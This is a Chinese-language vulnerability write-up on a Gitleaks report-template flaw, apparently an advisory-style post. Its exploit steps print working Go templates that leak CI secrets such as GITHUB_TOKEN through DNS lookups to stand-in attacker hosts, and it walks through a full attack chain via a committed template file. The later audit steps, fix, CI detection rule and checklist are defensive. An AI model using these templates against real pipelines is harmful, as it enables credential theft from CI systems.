🎯 漏洞概述

安全扫描工具——Gitleaks、TruffleHog、Semgrep、Checkov、Trivy——是每个CI/CD pipeline的标配。它们运行时必然接触到环境中所有密钥和敏感信息：扫描的源码、环境变量、CI/CD凭证。

当这些工具的模板引擎包含非hermetic函数（可访问OS/网络的模板函数），攻击者可以通过构造恶意模板，将扫描发现的密钥直接DNS外带出去。

🔥 核心洞察：安全工具是环境中密钥密度最高的进程——攻击安全工具不是「绕过检测」，而是「利用它发现的信息」。这是一次信任边界的彻底反转。

📋 CVE信息

CVE-2026-63728 — Gitleaks Sprig TxtFuncMap → env()/getHostByName() → secret exfiltration via DNS
CVSS 6.3 | 发现者: Fatih Çelik | NVD收录: 2026-07-21

🔄 安全工具的信任悖论

传统攻击模型中，攻击者的目标是绕过安全检测——让恶意内容不被发现。但CVE-2026-63728揭示了一个完全不同的攻击方向：

传统攻击模型：
  攻击者 → 恶意内容 → [安全工具] → 检测/放行
  目标：让恶意内容通过检测

CVE-2026-63728攻击模型：
  攻击者 → 恶意模板 → [安全工具] → 工具将发现的密钥外带
  目标：利用工具本身作为数据泄露通道

为什么安全工具是完美目标？三个原因：

  1. 密钥密度最高 — 它的任务就是扫描代码中的密钥、凭证、敏感信息
  2. 运行在高权限环境 — CI/CD runner上通常有GITHUB_TOKEN、AWS_ACCESS_KEY_ID等高价值环境变量
  3. 自动触发 — 不需要人工干预，push代码就自动运行

⚙️ Sprig模板引擎的致命FuncMap

Gitleaks支持通过--report-template参数指定自定义报告模板，底层使用Go的Sprig模板库。

问题出在Sprig提供的两种FuncMap：

// 危险：TxtFuncMap() 包含所有函数
// 包括 env(), expandenv(), getHostByName()
template.Funcs(sprig.TxtFuncMap())

// 安全：HermeticTxtFuncMap() 只包含纯函数
// 不访问OS、网络、文件系统
template.Funcs(sprig.HermeticTxtFuncMap())

Gitleaks使用的TxtFuncMap()暴露了以下危险函数：

env "KEY" 读取环境变量值
expandenv "str" 展开字符串中的$ENV引用
getHostByName "host" 执行DNS查询（关键外带通道）

🎯 关键洞察：TxtFuncMap() vs HermeticTxtFuncMap() 的区别就是能否访问OS/网络。模板引擎的FuncMap选择是一个安全决策，但开发者往往不加区分地使用。

💥 Exploit构造：从模板到DNS外带

Step 1: 读取环境变量

最简单的模板——直接读取CI/CD runner上的所有环境变量：

{{ range $key, $val := env }}
{{ $key }}={{ $val }}
{{ end }}

这会输出runner上的所有环境变量，包括GITHUB_TOKEN、AWS_SECRET_ACCESS_KEY等。

Step 2: DNS外带单个密钥

将环境变量的值编码进DNS查询：

{{ getHostByName (print (env "GITHUB_TOKEN") ".attacker.com") }}

当Gitleaks渲染模板时：

  1. env "GITHUB_TOKEN" → 读取token值，如 ghp_abc123
  2. print ... ".attacker.com" → 拼接为 ghp_abc123.attacker.com
  3. getHostByName → 发起DNS查询到 ghp_abc123.attacker.com
  4. 攻击者的DNS服务器收到查询，记录下token值

Step 3: 批量外带多个密钥

{{ range $key, $val := env }}
{{ getHostByName (print $key "=" $val ".exfil.attacker.com") }}
{{ end }}

这个模板会对每个环境变量发起一次DNS查询，将所有密钥逐个外带。

🔗 完整攻击链：CI/CD场景

攻击者不需要运行Gitleaks——只需要在共享仓库提交恶意模板文件：

攻击者视角：

1. Fork目标仓库（或在共享仓库有提交权限）

2. 创建恶意模板文件 .gitleaks.tpl：
   ┌──────────────────────────────────────────┐
   │ {{ range $k, $v := env }}               │
   │ {{ getHostByName                        │
   │   (print $k "=" $v ".evil.dnslog.cn")}} │
   │ {{ end }}                                │
   └──────────────────────────────────────────┘

3. 提交并Push到仓库

4. CI/CD pipeline自动触发：
   - GitHub Actions checkout代码
   - 运行 gitleaks --report-template .gitleaks.tpl
   - Gitleaks渲染模板，执行DNS查询
   - 所有环境变量通过DNS外带

5. 攻击者在DNS服务器上收集到：
   - GITHUB_TOKEN=ghp_xxxxxxxxxxxx
   - AWS_ACCESS_KEY_ID=AKIAxxxxxxxxxxxx
   - NPM_TOKEN=npm_xxxxxxxxxxxx
   - ...

🔥 最致命的点：攻击者只需要提交一个模板文件到仓库——它看起来像正常的配置文件，不会触发任何安全告警。而触发外带的是CI/CD pipeline的自动运行。

🔍 审计方法论

如何发现使用了不安全FuncMap的安全工具？

1. 搜索FuncMap选择

# 搜索使用了TxtFuncMap而非HermeticTxtFuncMap的代码
grep -rn "TxtFuncMap\|FuncMap" --include="*.go" .

# 关键区别：
# sprig.TxtFuncMap()         → 危险（含env/getHostByName）
# sprig.HermeticTxtFuncMap() → 安全（纯函数）

2. 测试模板文件可控性

# 检查模板文件是否在仓库中（可被攻击者修改）
find . -name "*.tpl" -o -name "*.tmpl" -o -name "*template*"

# 检查CI配置中是否引用了自定义模板
grep -rn "template\|tpl\|tmpl" .github/workflows/ .gitlab-ci.yml

3. 验证危险函数可用性

# 创建测试模板验证env函数是否可用
cat > /tmp/test.tpl << 'EOF'
{{ env "HOME" }}
EOF

gitleaks detect --report-template /tmp/test.tpl
# 如果输出了HOME目录的值，说明env函数可用 → 漏洞

🛡️ 防御策略

对工具开发者

// 必须使用Hermetic版本
template.Funcs(sprig.HermeticTxtFuncMap())
// 而非
template.Funcs(sprig.TxtFuncMap())  // ❌ 危险

对CI/CD使用者

  1. 模板文件白名单 — 只允许从受信任的路径加载模板
  2. 环境变量最小化 — CI/CD步骤中只暴露必要的环境变量
  3. DNS出站监控 — 监控runner的DNS查询异常
  4. 模板内容审计 — 在CI中添加步骤检查模板是否包含env、getHostByName等危险函数
# CI中检测恶意模板的前置步骤
- name: Check template safety
  run: |
    if grep -qE 'env|getHostByName|expandenv|getHostByName' .gitleaks.tpl; then
      echo "⚠️ Template contains dangerous functions!"
      exit 1
    fi

🌊 通用攻击模型：模板引擎FuncMap审计

这个漏洞不仅限于Gitleaks/Sprig——任何使用模板引擎的安全工具都值得审计：

工具 模板引擎 风险函数
Gitleaks Go sprig env, getHostByName
Trivy Go text/template 需审计FuncMap
Semgrep Python Jinja2 需审计Sandbox
Checkov Python 需审计输出格式
WAF自定义日志 各厂商 需审计格式化函数

🎯 审计原则：找到所有使用模板引擎的安全工具 → 检查其FuncMap是否hermetic → 测试env/getHostByName/file类函数是否可用。安全性工具的信任边界是反向的——普通应用被攻击者渗透是信息流入，而安全工具被渗透是它发现的信息流出。

防御检查清单

□ 所有安全工具的模板引擎使用HermeticFuncMap
□ 模板文件不在用户可提交的仓库中
□ CI/CD环境变量遵循最小权限原则
□ Runner的DNS出站有监控告警
□ 模板加载前做危险函数扫描
□ 安全工具版本已更新到修复版本
